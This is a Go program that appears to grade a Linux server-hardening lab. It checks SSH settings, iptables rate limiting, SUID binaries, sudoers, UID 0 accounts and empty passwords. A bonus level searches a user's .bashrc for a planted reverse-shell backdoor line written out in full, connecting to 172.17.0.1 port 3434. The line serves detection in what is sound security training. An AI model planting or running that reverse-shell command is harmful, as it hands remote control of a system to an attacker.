package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"slices"
	"strings"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func level1(option string, value string) bool {
	// Check if ssh allows login via password
	dat, err := os.ReadFile("/etc/ssh/sshd_config")
	check(err)

	stringArr := strings.Split(string(dat), "\n")

	// Go through the config, find all active lines with PasswordAuthentication
	// Only the last line for the option in the config counts
	optionArr := []string{}

	for _, s := range stringArr {
		// Trim leading and trailing whitespace from the line
		trimmedLine := strings.TrimSpace(s)
		// fmt.Println(trimmedLine)

		// Skip empty lines and commented-out lines
		if trimmedLine == "" || strings.HasPrefix(trimmedLine, "#") {
			continue
		}

		fields := strings.Fields(trimmedLine)
		// Check if the first field matches the option we're looking for
		if len(fields) > 1 && fields[0] == option {
			// Add the option value to the slice
			optionArr = append(optionArr, fields[1])
		}
	}

	// Check if the last occurrence of the option has the desired value
	if len(optionArr) > 0 {
		return strings.ToLower(optionArr[len(optionArr)-1]) == strings.ToLower(value)
	}
	// If option not found return false
	return false
}

func level1_0() bool {
	return level1("PasswordAuthentication", "no")
}

func level1_5() bool {
	return level1("PubkeyAuthentication", "yes")
}

func level1_75() bool {
	return level1("PermitRootLogin", "no")
}

func level2() bool {
	// Execute the iptables command to list all rules
	cmd := exec.Command("iptables", "-S")
	out, err := cmd.Output()
	if err != nil {
		fmt.Println("Error executing iptables command:", err)
		return false
	}

	// Convert the output to a string for parsing
	output := string(out)

	// Define required parts for a rate limiting rule on port 22
	requiredParts := []string{
		"-p tcp",
		"--dport 22",
		"-m limit",
		"--limit",
	}

	// Check if the output contains all of the required parts. If so then it is probably correct(?)
	containsAllParts := true
	for _, part := range requiredParts {
		if !strings.Contains(output, part) {
			containsAllParts = false
			break
		}
	}

	return containsAllParts // Returns true if all parts are found, false otherwise
	// Example command to pass: sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m limit --limit 3/min -j ACCEPT
}

func level3() bool {
	// Check if dangerous suid binaries exist on system (python3, find, vim)
	cmd := exec.Command("/bin/find", "/", "-perm", "-4000")
	cmd.Stderr = nil // ignore errors

	out, _ := cmd.Output()
	// check(err)

	bins := strings.Fields(string(out))

	return !(slices.Contains(bins, "/usr/bin/vim.basic") || slices.Contains(bins, "/usr/bin/find") || slices.Contains(bins, "/usr/bin/python3.10"))
	// To pass: sudo chmod u-s /usr/bin/find (and the others)
}

func level4() bool {
	// Check if dangerous sudo permissions are given for user bitty
	cmd := exec.Command("/bin/cat", "/etc/sudoers.d/bitty")
	out, _ := cmd.Output()

	if strings.Contains(string(out), "/bin/less /root/log_file.txt") {
		return false
	}

	return true
	// To pass: rm rf /etc/sudoers.d/bitty
}

func level5() bool {
	// Read the /etc/passwd file to find UIDs
	dat, err := os.ReadFile("/etc/passwd")
	check(err)

	passwdLines := strings.Split(string(dat), "\n")
	for _, line := range passwdLines {
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		fields := strings.Split(line, ":")
		// Ensure line has enough fields and UID field exists
		if len(fields) > 2 {
			uid := fields[2]
			username := fields[0]

			// Check for UID 0 that is not the root user
			if uid == "0" && username != "root" {
				return false
			}
		}
	}
	return true // No security issues found
	// TO pass, either use usermod -u 1111 dave, or manually edit passwd file

}

func level6() bool {
	// Read the /etc/shadow file to check for the users' passwords
	dat, err := os.ReadFile("/etc/shadow")
	check(err)

	shadowLines := strings.Split(string(dat), "\n")
	for _, line := range shadowLines {
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		fields := strings.Split(line, ":")
		if len(fields) > 2 {
			// Check if the password field is empty, "*", or "!"
			passwordField := fields[1]
			if passwordField == "" || passwordField == "*" || passwordField == "!" {
				// fmt.Printf("User without a password found: %s\n", fields[0])
				return false
			}
		}
	}

	return true
	// To pass: passwd dave
}

func level7() bool {
	cmd := exec.Command("ss", "-tuln")

	out, err := cmd.Output()
	check(err)

	output := string(out)

	// Check if port 3306 is not in the listening state
	if !strings.Contains(output, ":3306") {
		// fmt.Println("Level Solved: No listener found on port 3306.")
		return true
	} else {
		return false
	}
	// To pass: kill the process listening on port 3306
}

// searchStringInFile checks if a string is present in a file.
// Returns true if found, false otherwise.
func searchStringInFile(filePath string, searchString string) (bool, error) {
	// Open the file for reading.
	file, err := os.Open(filePath)
	if err != nil {
		return false, err
	}
	defer file.Close()

	// Create a new scanner for the file.
	scanner := bufio.NewScanner(file)

	// Loop through all lines of the file.
	for scanner.Scan() {
		// Check if the current line contains the search string.
		if strings.Contains(scanner.Text(), searchString) {
			return true, nil // Found the string.
		}
	}

	// Check for scanning error.
	if err := scanner.Err(); err != nil {
		return false, err
	}

	return false, nil // Did not find the string.
}
func bonusLevel() bool {
	found, _ := searchStringInFile("/home/bitty/.bashrc", "(/bin/bash -i >& /dev/tcp/172.17.0.1/3434 0>&1 & disown) 2>/dev/null; cat")
	return !found
}

var levelNames = [9]string{
	"1",
	"1.5",
	"1.75",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
}

var levelMethods = [9]func() bool{
	level1_0,
	level1_5,
	level1_75,
	level2,
	level3,
	level4,
	level5,
	level6,
	level7,
}

var levelHints = [9]string{
	"- Try checking if your sshd config is living up to current best practices regarding password-based logins",
	"- How are users supposed to login via SSH without password authentication?",
	"- It's not always a good idea to let users log in as root",
	"- Ensure your iptables configuration protects against brute-force attempts.",
	"- What are SUID binaries and how can you list all of them on your system? Which ones can be used by attackers to perform privilege escalation",
	"- Try finding out if any users can run commands as sudo. Should the user be able to run that command? Could it be dangerous?",
	"- Check for unexpected user entries in /etc/passwd that could indicate security issues.",
	"- Check for non-service users without a password set and give them a password",
	"- Make sure you don't expose ports on the server needlessly",
}

var hintFlag bool

func main() {
	// Maybe define a custom flag and hide a flag in it for the reversers???

	flag.BoolVar(&hintFlag, "hints", false, "Shows hint for each level. Try to not use this too much")
	flag.Parse()

	allPassed := true

	for i, levelName := range levelNames {
		if levelMethods[i]() {
			fmt.Printf("level %s: ☒\n", levelName)
		} else {
			fmt.Printf("level %s: ☐\n", levelName)
			allPassed = false
			if hintFlag {
				fmt.Println(levelHints[i])
			}
			break
		}
	}

	if allPassed {
		fmt.Println("BONUS LEVEL:\nAfter having fixed the more pressing issues, your manager returns.")
		fmt.Println("They congratulate you, however just before you pop the champagne")
		fmt.Println("you are informed that they suspect that a backdoor has been placed on the system. Can you find it and shut it down?")
		if !bonusLevel() {
			fmt.Println("Backdoor still present :(")
		} else {
			fmt.Println("Backdoor removed, good job!")
		}
	}

	// Do some iptable stuff regarding our nice ssh server, such as rate limiting. Check for whatever method is taught by the course
	// DO some fail2ban stuff
	// Do some SUID stuff - check
	// Do some sudo -l with insecure path stuff
	// Do some users with empty passwords stuff?
	// Read more about linux server hardening
	//maybe some selinux stuff
	// maybe some firewall stuff? firewalld or ufw
	// https://www.pluralsight.com/blog/it-ops/linux-hardening-secure-server-checklist stuff about password reuse is cool, also forcing users to change passwords
	// 11. Locking User Accounts After Login Failures
	// Make Sure No Non-Root Accounts Have UID Set To 0
	// Only allow root to access CRON
	//  /etc/shadow
	// 3. Set strong password policy
	// IDEA: set an interactive shell for a service account in passwd
	// IDEA: bonus levels with linux backdoors??? Could be cool.
	// IDEA: Add the option to disallow users to reuse old passwords requires setting up pam though
}
